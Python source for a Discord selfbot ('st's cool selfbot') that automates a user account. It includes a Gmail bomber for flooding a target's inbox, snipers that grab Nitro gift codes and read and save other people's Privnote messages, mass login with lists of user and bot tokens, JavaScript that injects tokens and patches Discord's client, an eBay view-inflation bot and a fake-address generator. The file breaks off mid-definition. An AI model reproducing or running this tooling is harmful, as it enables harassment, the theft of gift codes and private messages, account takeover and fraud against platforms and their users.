class SELFBOT():
    __linecount__ = 1933
    __version__ = 1.5
    
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS

ctypes.windll.kernel32.SetConsoleTitleW(f'[Cool st Selfbot v{SELFBOT.__version__}]')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def startprint():
    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"    
    
    print(f'''{Fore.RESET}
                                                
                              _   _               _  __ _           _   
                          ___| |_( )__   ___  ___| |/ _| |__   ___ | |_ 
                         / __| __|/ __| / __|/ _ \ | |_| '_ \ / _ \| __|
                         \__ \ |_ \__ \ \__ \  __/ |  _| |_) | (_) | |_ 
                         |___/\__||___/ |___/\___|_|_| |_.__/ \___/ \__|
                                                              


                              
{Fore.CYAN}! Thank you for using st's cool selfbot v{SELFBOT.__version__} 
{Fore.CYAN}! Logged in as: {Fore.WHITE} {stselfbot.user.name}#{stselfbot.user.discriminator} {Fore.CYAN} ID: {Fore.WHITE}{stselfbot.user.id}   
{Fore.CYAN}! Prefix: {Fore.WHITE}{prefix}
{Fore.CYAN}! Commands: {Fore.WHITE}140+
    '''+Fore.RESET)

def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            stselfbot.run(token, bot=False, reconnect=True)
            os.system(f'title (stselfbot Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

def GenAddress(addy: str):
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    four_char = ''.join(random.choice(letters) for _ in range(4))
    should_abbreviate = random.randint(0,1)
    if should_abbreviate == 0:
        if "street" in addy.lower():
            addy = addy.replace("Street", "St.")
            addy = addy.replace("street", "St.")
        elif "st." in addy.lower():
            addy = addy.replace("st.", "Street")
            addy = addy.replace("St.", "Street")
        if "court" in addy.lower():
            addy = addy.replace("court", "Ct.")
            addy = addy.replace("Court", "Ct.")
        elif "ct." in addy.lower():
            addy = addy.replace("ct.", "Court")
            addy = addy.replace("Ct.", "Court")
        if "rd." in addy.lower():
            addy = addy.replace("rd.", "Road")
            addy = addy.replace("Rd.", "Road")
        elif "road" in addy.lower():
            addy = addy.replace("road", "Rd.")
            addy = addy.replace("Road", "Rd.")
        if "dr." in addy.lower():
            addy = addy.replace("dr.", "Drive")
            addy = addy.replace("Dr.", "Drive")
        elif "drive" in addy.lower():
            addy = addy.replace("drive", "Dr.")
            addy = addy.replace("Drive", "Dr.")
        if "ln." in addy.lower():
            addy = addy.replace("ln.", "Lane")
            addy = addy.replace("Ln.", "Lane")
        elif "lane" in addy.lower():
            addy = addy.replace("lane", "Ln.")
            addy = addy.replace("lane", "Ln.")
    random_number = random.randint(1,99)
    extra_list = ["Apartment", "Unit", "Room"]
    random_extra = random.choice(extra_list)
    return four_char + " " + addy + " " + random_extra + " " + str(random_number)

def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return        

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

colorama.init()
stselfbot = discord.Client()
stselfbot = commands.Bot(
    description='stselfbot Selfbot',
    command_prefix=prefix,
    self_bot=True
)
stselfbot.remove_command('help') 

@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="Current BTC price: "+value+"$ USD", 
        url="https://www.twitch.tv/monstercat", 
    )
    await stselfbot.change_presence(activity=btc_stream)

@stselfbot.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)

@stselfbot.event
async def on_message_edit(before, after):
    await stselfbot.process_commands(after)

@stselfbot.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)        

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
    
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
            
    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{stselfbot.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)    
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await stselfbot.process_commands(message)

@stselfbot.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"    
    
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Cool st Selfbot v{SELFBOT.__version__}] | Logged in as {stselfbot.user.name}')

@stselfbot.command()
async def clear(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Clear]'''+Fore.RESET)
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

@stselfbot.command()
async def genname(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Genname]'''+Fore.RESET)
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@stselfbot.command()
async def lmgtfy(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Lmgtfy]'''+Fore.RESET)
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')

@stselfbot.command()
async def login(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Login]'''+Fore.RESET)
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')    

@stselfbot.command()
async def botlogin(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Botlogin]'''+Fore.RESET)
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([  
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'stselfbot-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ 
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')

@stselfbot.command()
async def address(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Address]'''+Fore.RESET)
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i+=1
    final_str = "\n".join(address_array)
    em = discord.Embed(description=final_str)
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)    

@stselfbot.command()
async def weather(ctx, *, city): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Weather]'''+Fore.RESET)
    if weather_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')    
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@stselfbot.command(aliases=['shorten'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Bitly]'''+Fore.RESET)
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r) 
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@stselfbot.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Cuttly]'''+Fore.RESET)
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@stselfbot.command() 
async def cat(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Cat]'''+Fore.RESET)
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"https://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@stselfbot.command()
async def dog(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Dog]'''+Fore.RESET)
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))    

@stselfbot.command()
async def fox(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Fox]'''+Fore.RESET)
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random fox image (sts cool selfbot kid)", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])    

@stselfbot.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@stselfbot.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@stselfbot.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Ebayview]'''+Fore.RESET)
    start_time = datetime.datetime.now()
    def EbayViewer(url, views):
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }        
        for _i in range(views):
            requests.get(url, headers=headers)
    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='sts cool selfbot')
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)

@stselfbot.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Geoip]'''+Fore.RESET)
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@stselfbot.command()
async def pingweb(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Pingweb]'''+Fore.RESET)
    if website is None: 
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)       

@stselfbot.command()
async def tweet(ctx, username: str, *, message: str): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            await ctx.send(embed=em)

@stselfbot.command()
async def revav(ctx, user: discord.User=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@stselfbot.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.User=None): # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}"))      

@stselfbot.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Roleinfo]'''+Fore.RESET)
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
    f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)

@stselfbot.command()
async def whois(ctx, *, user: discord.User = None): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Whois]'''+Fore.RESET)
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

@stselfbot.command()
async def combine(ctx, name1, name2): # b'\xfc'
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)       

@stselfbot.command(name='1337-speak', aliases=['1337speak'])
